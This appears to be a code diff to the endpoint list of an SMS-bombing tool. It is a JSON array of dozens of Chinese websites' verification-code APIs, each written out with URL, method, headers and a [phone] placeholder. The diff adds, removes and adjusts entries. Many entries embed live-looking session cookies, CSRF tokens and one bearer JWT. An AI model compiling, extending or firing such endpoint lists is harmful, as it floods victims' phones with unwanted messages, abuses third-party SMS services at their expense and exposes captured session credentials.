@@ -1609,6 +1609,15 @@
         "data": "mobile=[phone]"
     },
     {
+        "desc": "51牛股数据分析",
+        "url": "http://111.230.212.238/SendCodevvv",
+        "method": "POST",
+        "header": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+        },
+        "data": "phone=[phone]"
+    },
+    {
         "desc": "120.26.33.196",
         "url": "http://120.26.33.196/smart-sms-api/api/sms/send",
         "method": "POST",
@@ -2221,6 +2230,18 @@
         "data": "phone=[phone]&sms="
     },
     {
+        "desc": "中国公路学会科学技术奖申报管理系统",
+        "url": "https://award.chts.cn/reviewer/verifycode.php?code=get&mobile=[phone]",
+        "method": "GET",
+        "header": {
+            "Cookie": "SZACSESSID=7hp0als9kfh19o1ebkjqk0uho6",
+            "Referer": "https://award.chts.cn/reviewer/login.php",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+            "X-Requested-With": "XMLHttpRequest"
+        },
+        "data": null
+    },
+    {
         "desc": "登录 - 易安游戏交易平台",
         "url": "https://www.goyian.com/api/user/send_sms.php",
         "method": "POST",
@@ -2406,7 +2427,7 @@
             "Referer": "https://zhaopin.chinatowercom.cn/login?mode=CODE",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
         },
-        "data": null
+        "data": ""
     },
     {
         "desc": "注册-智米官网",
@@ -2535,21 +2556,6 @@
         }
     },
     {
-        "desc": "2025国际光化学技术与产业大会 管理端-注册页面",
-        "url": "https://www.2025icpi.com/member/sendSms?mobile=[phone]",
-        "method": "GET",
-        "header": {
-            "Accept": "*/*",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Cookie": "lg=cn; UNIQUEID=vsssssofio1fvekdqsp75ddjdk",
-            "Referer": "https://www.2025icpi.com/member/register/",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": null
-    },
-    {
         "desc": "中国民航通用航空信息服务平台",
         "url": "https://ga.aischina.com/security_captcha/sms_captcha?mobile=[phone]",
         "method": "GET",
@@ -2564,26 +2570,7 @@
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
             "X-Requested-With": "XMLHttpRequest"
         },
-        "data": null
-    },
-    {
-        "desc": "全国住建系统专业技术人员在线学习平台",
-        "url": "https://www.mayortraining.net/entity/studentRegister/studentRegister_sendCode.action",
-        "method": "POST",
-        "header": {
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Connection": "keep-alive",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Cookie": "acw_tc=7959d1da17733166671903197ee67d1cad1e8a8fb616afc283dfeceba77e69; typx_cms_https=7bb6207b0db469c9f07ebdd601bebb93; typx_https=6b3d8ac4ba397b121cb2d04cd6849e72; JSESSIONID=1CAD764631AFEDF2A9860CD6B516DAB8.jigou-typx-webapps-0001_typx_aliyun2; regLoginId=; regAuthimgCode=; regMobileCode=; regMobile=; pwdPass=; regPassword=; regAvatarId=; regIsValidCode=; Hm_lvt_90496d4ce6399d5e4d12d99d50f142a3=1772989951,1773316670; Hm_lpvt_90496d4ce6399d5e4d12d99d50f142a3=1773316670; HMACCOUNT=EA808DA86D48B8B0; portalPath=index; organId=18b4b9de-203d-11ec-aeee-801844e81850; isChildOrgan=1; Hm_lvt_f5b7f242b7dd1344a57a8c291e81ced4=1772989952,1773316671; Hm_lpvt_f5b7f242b7dd1344a57a8c291e81ced4=1773316671",
-            "Host": "www.mayortraining.net",
-            "Origin": "https://www.mayortraining.net",
-            "Referer": "https://www.mayortraining.net/cms/register.htm",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": "phone=[phone]"
+        "data": ""
     },
     {
         "desc": "南京莱博信息科技有限公司",
@@ -2679,21 +2666,6 @@
         }
     },
     {
-        "desc": "嘉实公益",
-        "url": "https://jsgy.org.cn/service/user/exist?phone=[phone]",
-        "method": "GET",
-        "header": {
-            "Accept": "application/json, text/javascript",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Referer": "https://jsgy.org.cn/register",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": ""
-    },
-    {
         "desc": "新生支付-注册-激活账号",
         "url": "https://portal.hnapay.com/cust/register/reSendSMS.shtml?time=1773317828964&mobileNo=[phone]",
         "method": "GET",
@@ -2709,23 +2681,6 @@
             "X-Requested-With": "XMLHttpRequest"
         },
         "data": ""
-    },
-    {
-        "desc": "注册-ANA中文站",
-        "url": "https://anapatterns.cn/api/sms/send",
-        "method": "POST",
-        "header": {
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Cookie": "server_name_session=12ead69711f40543c0d416603a10c33d; Hm_lvt_ee2c4c13bbf7dc7819d47f718a7d2e80=1773317848; Hm_lpvt_ee2c4c13bbf7dc7819d47f718a7d2e80=1773317848; HMACCOUNT=EA808DA86D48B8B0",
-            "Origin": "https://anapatterns.cn",
-            "Referer": "https://anapatterns.cn/register",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": "mobile=[phone]&event=register"
     },
     {
         "desc": "上海科技大学",
@@ -2814,7 +2769,7 @@
             "cookie": "node_id=nginx_1; SESSION=66f1c1d9-79ae-4bfe-bee0-721642b1a048",
             "Referer": "https://talent.hikvision.com/register"
         },
-        "data": null
+        "data": ""
     },
     {
         "desc": "平安健康商圈-注册",
@@ -2886,21 +2841,6 @@
         "data": "phone=[phone]&formData=true&"
     },
     {
-        "desc": "会员注册",
-        "url": "https://m.qtccolor.com/ajax.axd?t=SendRegPhoneCode&phone=[phone]&ismail=0",
-        "method": "GET",
-        "header": {
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Cookie": "shopcartId=ba8b523aec8dd61d33daff462ae97c8f; sem=1; site_key=; site_s=; ASP.NET_SessionId=0hk2du2vtwuvbjvjxgbqo03s; sendcount2=QXsjh/O0Ym4=; Hm_lvt_9ee710a3761973efa0e6eefd3535c509=1772990056,1773318872; Hm_lpvt_9ee710a3761973efa0e6eefd3535c509=1773318872; HMACCOUNT=EA808DA86D48B8B0",
-            "Referer": "https://m.qtccolor.com/Register.aspx",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": ""
-    },
-    {
         "desc": "注册-豪爵官方商城",
         "url": "https://shop.haojue.com/m/passport-send_vcode_sms2.html",
         "method": "POST",
@@ -2933,54 +2873,6 @@
             "X-Requested-With": "XMLHttpRequest"
         },
         "data": "event=register&mobile=[phone]&dialCode=%2B86"
-    },
-    {
-        "desc": "验证手机号码",
-        "url": "https://www.djc123.com/djc-gateway/sms-codes/register?__platDomain__=account.gec123.com&geetest_challenge=d82c8d1619ad8176d665453cfb2e55f07f&geetest_seccode=e5e11ef89_111e57286_1e1e111eebc7f36%7Cjordan&geetest_validate=e5e11ef89_111e57286_1e1e111eebc7f36",
-        "method": "POST",
-        "header": {
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Connection": "keep-alive",
-            "Content-Type": "application/json;charset=UTF-8",
-            "Host": "www.djc123.com",
-            "Origin": "https://account.gec123.com",
-            "Referer": "https://account.gec123.com/",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
-        },
-        "data": {
-            "mobile": "[phone]"
-        }
-    },
-    {
-        "desc": "江苏省材料学会",
-        "url": "https://www.jsmrs.org.cn/api/v1/iot/sms/code/register/[phone]",
-        "method": "PUT",
-        "header": {
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJYR3hLQjBmczMyMkszS2s4VmNSektyeENQUTFnY2RrTG5la296MUxib1owIn0.eyJleHAiOjE3NzM0MDU0MDQsImlhdCI6MTc3MzMxOTAwNCwianRpIjoiYTk2MDM3NTctM2QyMi00MmU4LWE0MGQtZjczODlkMDAxOGY5IiwiaXNzIjoiaHR0cDovL2tleWNsb2FrLmtleWNsb2FrL3JlYWxtcy9qc21ycyIsImF1ZCI6ImFjY291bnQiLCJzdWIiOiJlZjBiOTYxMS1iOTFjLTRjODgtYWNjNS1lMmI0NDNmODE1ZDkiLCJ0eXAiOiJCZWFyZXIiLCJhenAiOiJqc21ycy13ZWIiLCJhbGxvd2VkLW9yaWdpbnMiOlsiIl0sInJlYWxtX2FjY2VzcyI6eyJyb2xlcyI6WyJkZWZhdWx0LXJvbGVzLWpzbXJzIiwib2ZmbGluZV9hY2Nlc3MiLCJ1bWFfYXV0aG9yaXphdGlvbiJdfSwicmVzb3VyY2VfYWNjZXNzIjp7ImFjY291bnQiOnsicm9sZXMiOlsibWFuYWdlLWFjY291bnQiLCJtYW5hZ2UtYWNjb3VudC1saW5rcyIsInZpZXctcHJvZmlsZSJdfX0sInNjb3BlIjoiIiwiY2xpZW50SWQiOiJqc21ycy13ZWIiLCJjbGllbnRIb3N0IjoiMTEyLjk5LjM0LjYwIiwiY2xpZW50QWRkcmVzcyI6IjExMi45OS4zNC42MCJ9.HbhQC0ToKOM1tg9T7wK1VzplGnMfoJUGtAddSpXoJ0o2SWC6p0z0KszDDGkn1pbvWQinuT9F9Ty7snajv7Dy1auZZr-vLYcEfcftXDUK4AyoncDM5GqyxutMjTHZrnRdJCWwpmMDK9afdxLzcpni3SDLdSRrk6vWo4k41BsOS852wttigObgPQJck3t1-s8DiGecnJTwrenRonpeiKm_pELJ0dUawlTa31trwC33GXo7m-033_f-Yti7FN5o52LVeRfPwrJNWwqYI4XVLdUXGOBcZYNyxo0qv_su46SyTee3T31HLx0C3_ScVOY8rEc5IjhSUZyLu55ITYBvCw5u_A",
-            "Cookie": "Hm_lvt_358ebe55ef52fbff3dab6e0cc56cac80=1773318951; Hm_lpvt_358ebe55ef52fbff3dab6e0cc56cac80=1773318951; HMACCOUNT=EA808DA86D48B8B0",
-            "Origin": "https://www.jsmrs.org.cn",
-            "Referer": "https://www.jsmrs.org.cn/register?type=company",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
-        },
-        "data": ""
-    },
-    {
-        "desc": "注册 - 水木书荟",
-        "url": "https://huiyi.shuimushuhui.com/api/user/verifi_mobile/[phone]",
-        "method": "GET",
-        "header": {
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Referer": "https://huiyi.shuimushuhui.com/register",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
-        },
-        "data": ""
     },
     {
         "desc": "云南科技创新服务平台",
@@ -3031,25 +2923,7 @@
             "Referer": "https://sz.cdpee.org.cn/register/",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
         },
-        "data": null
-    },
-    {
-        "desc": "注册--机械工业出版社",
-        "url": "http://www.cmpedu.com/register/rphone_sendsms.htm",
-        "method": "POST",
-        "header": {
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Accept-Encoding": "gzip, deflate",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Cookie": "JSESSIONID=0F2967A32959C4E4C209A4D8C1764373; Hm_lvt_f5f40166de163b95a743f8afdac508c3=1773320859; Hm_lpvt_f5f40166de163b95a743f8afdac508c3=1773320859; HMACCOUNT=EA808DA86D48B8B0",
-            "Host": "www.cmpedu.com",
-            "Origin": "http://www.cmpedu.com",
-            "Referer": "http://www.cmpedu.com/register/reg.htm",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": "phone=[phone]"
+        "data": ""
     },
     {
         "desc": "火山引擎-你的AI云",
@@ -3152,42 +3026,6 @@
         }
     },
     {
-        "desc": "注册 | 信捷技术",
-        "url": "https://college.xinje.net/wp-admin/admin-ajax.php",
-        "method": "POST",
-        "header": {
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Cookie": "_s_prefix=5c667cecdc831993cddcb12154171ac2",
-            "Origin": "https://college.xinje.net",
-            "Referer": "https://college.xinje.net/register/",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": "user_phone=[phone]&send_sms_code_nonce=bf4b8137f8&_wp_http_referer=%2Fregister%2F&sms_code=&user_pass=&member_form_register_nonce=eb718492a6&_wp_http_referer=%2Fregister%2F&action=wpcom_send_sms_code"
-    },
-    {
-        "desc": "填写信息 - 西门子 EDA",
-        "url": "http://disw.siemensevent.cn:9000/disw/user/ajax/generate-mobile-code",
-        "method": "POST",
-        "header": {
-            "Accept": "*/*",
-            "Accept-Encoding": "gzip, deflate",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary2iTb4N4ty4LMIMdE",
-            "Cookie": "csrftoken=nCSdD46zxl7ERXDGjOdpbucQjdsAwoRKz6d3yOxSfJOcA2cBfyF39DU7f6nZTXB9; _pk_ref.7.033b=%5B%22%22%2C%22%22%2C1773329959%2C%22https%3A%2F%2Fwww.google.com.hk%2F%22%5D; _pk_id.7.033b=cd3f787f2b2cfcd6.1773329959.; _pk_ses.7.033b=1",
-            "Host": "disw.siemensevent.cn:9000",
-            "Origin": "http://disw.siemensevent.cn:9000",
-            "Referer": "http://disw.siemensevent.cn:9000/disw/we/eda004/register/info/",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Csrftoken": "przwymvvkJXoGBjeYzlIVm9X0JDR9lMQBVUmt6WO27EWpGS9UjNmTvReWCygwUwf",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": "------WebKitFormBoundary2iTb4N4ty4LMIMdEContent-Disposition: form-data; name=\"mobile\"86[phone]------WebKitFormBoundary2iTb4N4ty4LMIMdEContent-Disposition: form-data; name=\"meeting_code\"eda004------WebKitFormBoundary2iTb4N4ty4LMIMdE--"
-    },
-    {
         "desc": "恒源云_GPUSHARE-恒源智享云",
         "url": "https://api.gpushare.com/app/api/auth/register/send_code",
         "method": "POST",
@@ -3256,42 +3094,6 @@
         }
     },
     {
-        "desc": "拼阀网—阀门现货网，阀门现货超市，泵阀定制电子商务平台",
-        "url": "https://www.pinpv.com/mes/demo/sendmes.php?a=[phone]",
-        "method": "GET",
-        "header": {
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Connection": "keep-alive",
-            "Cookie": "PHPSESSID=5bude49euqj58qo33hl2glr0i3",
-            "Host": "www.pinpv.com",
-            "Referer": "https://www.pinpv.com/enroll.php",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": ""
-    },
-    {
-        "desc": "用户登录 - SSL盾证书ssldun®",
-        "url": "https://www.ssldun.cn/modules/addons/smscenter/action.php?action=loginsend",
-        "method": "POST",
-        "header": {
-            "Accept": "application/json, text/javascript, */*; q=0.01",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Connection": "keep-alive",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Cookie": "WHMCSC1GL71jXo3Rh=b3s1laspjnfac20u3g3v1cb8tj",
-            "Host": "www.ssldun.cn",
-            "Origin": "https://www.ssldun.cn",
-            "Referer": "https://www.ssldun.cn/index.php?rp=/login",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": "phonenumber=[phone]&token=7a4f5e3926390c77f96fbe72a7b61483971ccadd"
-    },
-    {
         "desc": "XZPhotos - 注册账号",
         "url": "https://www.xzphotos.cn/gallery/register.php",
         "method": "POST",
@@ -3324,23 +3126,6 @@
             "X-Requested-With": "XMLHttpRequest"
         },
         "data": "act=dtname&mobile=[phone]"
-    },
-    {
-        "desc": "卡多多 - 账户注册",
-        "url": "https://ka.dandanhou.net/agent/controller/sendsms.php",
-        "method": "POST",
-        "header": {
-            "Accept": "*/*",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "Cookie": "PHPSESSID=v4pkllkrh1a5ogs839cq9g3mpi",
-            "Origin": "https://ka.dandanhou.net",
-            "Referer": "https://ka.dandanhou.net/agent/reg",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-            "X-Requested-With": "XMLHttpRequest"
-        },
-        "data": "phone=[phone]&sekey=4208f1ea6ba0fb3dc7e0e73868a8b34a4289a1f67a91f119cedf0875b0785831"
     },
     {
         "desc": "辛集房产网 - 会员中心登陆",
@@ -3390,23 +3175,6 @@
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
         },
         "data": ""
-    },
-    {
-        "desc": "新海网登录页",
-        "url": "http://www.xinhainews.com/user/check_code.php",
-        "method": "POST",
-        "header": {
-            "Accept": "*/*",
-            "Accept-Encoding": "gzip, deflate",
-            "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Cookie": "PHPSESSID=cgn28140tk52cqavqkbtpp2dm7; device_token=c19196901b7af13893e7a009892c6a4fd8a666bcdb0df172cddb245da72bea73",
-            "Host": "www.xinhainews.com",
-            "Origin": "http://www.xinhainews.com",
-            "Referer": "http://www.xinhainews.com/m/login.php",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
-        },
-        "data": "action=send_sms&phone=[phone]"
     },
     {
         "desc": "用户注册 | 感知上海",
